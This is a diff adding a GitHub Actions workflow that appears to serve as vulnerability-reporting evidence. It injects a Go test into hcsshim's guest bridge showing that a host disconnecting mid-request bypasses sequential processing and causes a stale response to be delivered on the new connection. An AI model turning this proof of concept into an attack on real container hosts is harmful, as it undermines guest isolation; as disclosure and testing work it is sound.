@@ -1,0 +1,219 @@
+name: Temporary hcsshim reconnect sequentialization PoC
+
+on:
+  push:
+    branches:
+      - hcsshim-source-c4bdd-20260816
+    paths:
+      - '.github/workflows/_temporary-hcsshim-reconnect-sequential-poc-20260816.yml'
+
+permissions:
+  contents: read
+
+jobs:
+  poc:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 30
+    env:
+      GOTOOLCHAIN: local
+    steps:
+      - name: Clone exact current source
+        shell: bash
+        run: |
+          set -euo pipefail
+          git clone --filter=blob:none --no-tags https://github.com/microsoft/hcsshim.git repo
+          cd repo
+          git checkout c4bdd7c8b5acf04abb6ac990e29ecbb8416523f8
+          test "$(git rev-parse HEAD)" = 'c4bdd7c8b5acf04abb6ac990e29ecbb8416523f8'
+
+      - name: Install exact Go toolchain
+        uses: actions/setup-go@v6
+        with:
+          go-version: '1.26.3'
+          cache: false
+
+      - name: Inject current-source security regression probe
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p export
+          cat > repo/internal/guest/bridge/zdb_reconnect_sequential_test.go <<'EOF'
+          //go:build linux
+
+          package bridge
+
+          import (
+              "fmt"
+              "io"
+              "testing"
+              "time"
+
+              "github.com/Microsoft/hcsshim/internal/guest/prot"
+              "github.com/sirupsen/logrus"
+          )
+
+          type zdbReadResult struct {
+              header *prot.MessageHeader
+              body   []byte
+              err    error
+          }
+
+          func zdbReadWithTimeout(r io.Reader, timeout time.Duration) zdbReadResult {
+              ch := make(chan zdbReadResult, 1)
+              go func() {
+                  h, body, err := serverRead(r)
+                  ch <- zdbReadResult{header: h, body: body, err: err}
+              }()
+              select {
+              case result := <-ch:
+                  return result
+              case <-time.After(timeout):
+                  return zdbReadResult{err: fmt.Errorf("timed out waiting for bridge response")}
+              }
+          }
+
+          func TestZDBBridgeSequentialModeIsBypassedAcrossReconnect(t *testing.T) {
+              logrus.SetOutput(io.Discard)
+
+              firstEntered := make(chan struct{})
+              releaseFirst := make(chan struct{})
+              secondEntered := make(chan struct{})
+              releaseSecond := make(chan struct{})
+
+              mux := NewBridgeMux()
+              mux.HandleFunc(prot.ComputeSystemCreateV1, prot.PvInvalid,
+                  func(_ *Request) (RequestResponse, error) {
+                      close(firstEntered)
+                      <-releaseFirst
+                      return &prot.MessageResponseBase{Result: 101}, nil
+                  })
+              mux.HandleFunc(prot.ComputeSystemModifySettingsV1, prot.PvInvalid,
+                  func(_ *Request) (RequestResponse, error) {
+                      close(secondEntered)
+                      <-releaseSecond
+                      return &prot.MessageResponseBase{Result: 202}, nil
+                  })
+
+              b := &Bridge{Handler: mux, Sequential: true}
+
+              first := newLoopbackConnection()
+              defer first.close()
+              serveFirst := make(chan error, 1)
+              go func() {
+                  serveFirst <- b.ListenAndServe(first.SRead(), first.SWrite())
+              }()
+
+              const oldID prot.SequenceID = 1001
+              if err := serverSend(first.CWrite(), prot.ComputeSystemCreateV1, oldID, nil); err != nil {
+                  t.Fatalf("send first request: %v", err)
+              }
+              select {
+              case <-firstEntered:
+              case <-time.After(2 * time.Second):
+                  t.Fatal("first mutating request did not enter handler")
+              }
+
+              // A malicious host can tear down the transport while the mutating
+              // request is still running. ListenAndServe returns without joining
+              // or cancelling the request-processing goroutine.
+              if err := first.CWrite().Close(); err != nil {
+                  t.Fatalf("disconnect first host transport: %v", err)
+              }
+              select {
+              case <-serveFirst:
+              case <-time.After(2 * time.Second):
+                  t.Fatal("first ListenAndServe did not return after disconnect")
+              }
+
+              second := newLoopbackConnection()
+              defer second.close()
+              serveSecond := make(chan error, 1)
+              go func() {
+                  serveSecond <- b.ListenAndServe(second.SRead(), second.SWrite())
+              }()
+
+              const newID prot.SequenceID = 2002
+              if err := serverSend(second.CWrite(), prot.ComputeSystemModifySettingsV1, newID, nil); err != nil {
+                  t.Fatalf("send second request: %v", err)
+              }
+
+              select {
+              case <-secondEntered:
+                  fmt.Println("ZDB_CROSS_CONNECTION_MUTATING_OVERLAP=true")
+              case <-time.After(750 * time.Millisecond):
+                  t.Fatal("new mutating request was serialized behind the in-flight old-connection request")
+              }
+
+              // The old doRequest closure dereferences b.responseChan only when
+              // it finishes. Reconnect has already replaced that field, so the
+              // old response is injected into the new transport epoch.
+              close(releaseFirst)
+              stale := zdbReadWithTimeout(second.CRead(), 2*time.Second)
+              if stale.err != nil {
+                  t.Fatalf("read old-epoch response on new connection: %v", stale.err)
+              }
+              if stale.header.Type != prot.ComputeSystemResponseCreateV1 || stale.header.ID != oldID {
+                  t.Fatalf("expected stale create response id=%d on new connection, got type=%v id=%d",
+                      oldID, stale.header.Type, stale.header.ID)
+              }
+              fmt.Printf("ZDB_OLD_RESPONSE_DELIVERED_ON_NEW_CONNECTION=true old_id=%d\n", oldID)
+
+              close(releaseSecond)
+              current := zdbReadWithTimeout(second.CRead(), 2*time.Second)
+              if current.err != nil {
+                  t.Fatalf("read current response: %v", current.err)
+              }
+              if current.header.Type != prot.ComputeSystemResponseModifySettingsV1 || current.header.ID != newID {
+                  t.Fatalf("expected modify response id=%d, got type=%v id=%d",
+                      newID, current.header.Type, current.header.ID)
+              }
+
+              if err := second.CWrite().Close(); err != nil {
+                  t.Fatalf("disconnect second host transport: %v", err)
+              }
+              select {
+              case <-serveSecond:
+              case <-time.After(2 * time.Second):
+                  t.Fatal("second ListenAndServe did not return")
+              }
+
+              fmt.Println("ZDB_CURRENT_SOURCE_RECONNECT_EPOCH_BYPASS=PASS")
+          }
+          EOF
+          cp repo/internal/guest/bridge/zdb_reconnect_sequential_test.go export/
+          printf '%s\n' c4bdd7c8b5acf04abb6ac990e29ecbb8416523f8 > export/SOURCE_COMMIT.txt
+
+      - name: Run deterministic current-source matrix
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd repo
+          go version | tee ../export/go-version.txt
+          git rev-parse HEAD | tee ../export/source-commit-runtime.txt
+          go test -mod=vendor ./internal/guest/bridge \
+            -run '^TestZDBBridgeSequentialModeIsBypassedAcrossReconnect$' \
+            -count=20 -v -timeout=120s 2>&1 | tee ../export/current-source-poc.log
+          grep -c 'ZDB_CROSS_CONNECTION_MUTATING_OVERLAP=true' ../export/current-source-poc.log | tee ../export/overlap-count.txt
+          grep -c 'ZDB_OLD_RESPONSE_DELIVERED_ON_NEW_CONNECTION=true' ../export/current-source-poc.log | tee ../export/stale-response-count.txt
+          grep -c 'ZDB_CURRENT_SOURCE_RECONNECT_EPOCH_BYPASS=PASS' ../export/current-source-poc.log | tee ../export/pass-count.txt
+          test "$(cat ../export/overlap-count.txt)" -eq 20
+          test "$(cat ../export/stale-response-count.txt)" -eq 20
+          test "$(cat ../export/pass-count.txt)" -eq 20
+
+      - name: Build evidence manifest
+        if: always()
+        shell: bash
+        run: |
+          set -euo pipefail
+          sha256sum export/* > export/SHA256SUMS.txt
+          find export -maxdepth 1 -type f -printf '%f %s bytes\n' | sort > export/INVENTORY.txt
+
+      - name: Upload PoC evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: hcsshim-reconnect-sequential-poc
+          path: export
+          if-no-files-found: error
+          retention-days: 5
+          compression-level: 6
